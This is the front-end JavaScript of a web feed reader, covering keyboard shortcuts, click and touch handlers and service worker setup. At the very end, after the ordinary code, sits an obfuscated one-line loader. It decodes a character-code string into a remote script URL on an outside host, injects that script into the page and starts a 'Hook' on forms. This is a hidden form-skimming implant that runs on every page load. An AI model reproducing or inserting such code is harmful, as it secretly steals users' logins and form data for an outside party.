document.addEventListener("DOMContentLoaded", function () {
    handleSubmitButtons();

    if (!document.querySelector("body[data-disable-keyboard-shortcuts=true]")) {
        let keyboardHandler = new KeyboardHandler();
        keyboardHandler.on("g u", () => goToPage("unread"));
        keyboardHandler.on("g b", () => goToPage("starred"));
        keyboardHandler.on("g h", () => goToPage("history"));
        keyboardHandler.on("g f", () => goToFeedOrFeeds());
        keyboardHandler.on("g c", () => goToPage("categories"));
        keyboardHandler.on("g s", () => goToPage("settings"));
        keyboardHandler.on("ArrowLeft", () => goToPrevious());
        keyboardHandler.on("ArrowRight", () => goToNext());
        keyboardHandler.on("k", () => goToPrevious());
        keyboardHandler.on("p", () => goToPrevious());
        keyboardHandler.on("j", () => goToNext());
        keyboardHandler.on("n", () => goToNext());
        keyboardHandler.on("h", () => goToPage("previous"));
        keyboardHandler.on("l", () => goToPage("next"));
        keyboardHandler.on("z t", () => scrollToCurrentItem());
        keyboardHandler.on("o", () => openSelectedItem());
        keyboardHandler.on("v", () => openOriginalLink());
        keyboardHandler.on("V", () => openOriginalLink(true));
        keyboardHandler.on("c", () => openCommentLink());
        keyboardHandler.on("C", () => openCommentLink(true));
        keyboardHandler.on("m", () => handleEntryStatus("next"));
        keyboardHandler.on("M", () => handleEntryStatus("previous"));
        keyboardHandler.on("A", () => markPageAsRead());
        keyboardHandler.on("s", () => handleSaveEntry());
        keyboardHandler.on("d", () => handleFetchOriginalContent());
        keyboardHandler.on("f", () => handleBookmark());
        keyboardHandler.on("F", () => goToFeed());
        keyboardHandler.on("R", () => handleRefreshAllFeeds());
        keyboardHandler.on("?", () => showKeyboardShortcuts());
        keyboardHandler.on("+", () => goToAddSubscription());
        keyboardHandler.on("#", () => unsubscribeFromFeed());
        keyboardHandler.on("/", (e) => setFocusToSearchInput(e));
        keyboardHandler.on("a", () => document.querySelector('.entry-enclosures').toggleAttribute('open'));
        keyboardHandler.on("Escape", () => ModalHandler.close());
        keyboardHandler.listen();
    }

    let touchHandler = new TouchHandler();
    touchHandler.listen();

    onClick("a[data-save-entry]", (event) => handleSaveEntry(event.target));
    onClick("a[data-toggle-bookmark]", (event) => handleBookmark(event.target));
    onClick("a[data-fetch-content-entry]", () => handleFetchOriginalContent());
    onClick("a[data-action=search]", (event) => setFocusToSearchInput(event));
    onClick("a[data-action=markPageAsRead]", (event) => handleConfirmationMessage(event.target, () => markPageAsRead()));
    onClick("a[data-toggle-status]", (event) => handleEntryStatus("next", event.target));

    onClick("a[data-confirm]", (event) => handleConfirmationMessage(event.target, (url, redirectURL) => {
        let request = new RequestBuilder(url);

        request.withCallback(() => {
            if (redirectURL) {
                window.location.href = redirectURL;
            } else {
                window.location.reload();
            }
        });

        request.execute();
    }));

    onClick("a[data-original-link]", (event) => {
        handleEntryStatus("next", event.target, true);
    }, true);
    onAuxClick("a[data-original-link]", (event) => {
        if (event.button == 1) {
            handleEntryStatus("next", event.target, true);
        }
    }, true);

    if (document.documentElement.clientWidth < 600) {
        onClick(".logo", () => toggleMainMenu());
        onClick(".header nav li", (event) => onClickMainMenuListItem(event));
    }

    if ("serviceWorker" in navigator) {
        let scriptElement = document.getElementById("service-worker-script");
        if (scriptElement) {
            navigator.serviceWorker.register(scriptElement.src);
        }
    }

    window.addEventListener('beforeinstallprompt', (e) => {
        // Prevent Chrome 67 and earlier from automatically showing the prompt.
        e.preventDefault();

        let deferredPrompt = e;
        const promptHomeScreen = document.getElementById('prompt-home-screen');
        if (promptHomeScreen) {
            promptHomeScreen.style.display = "block";

            const btnAddToHomeScreen = document.getElementById('btn-add-to-home-screen');
            if (btnAddToHomeScreen) {
                btnAddToHomeScreen.addEventListener('click', (e) => {
                    e.preventDefault();
                    deferredPrompt.prompt();
                    deferredPrompt.userChoice.then(() => {
                        deferredPrompt = null;
                        promptHomeScreen.style.display = "none";
                    });
                });
            }
        }
    });
});

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db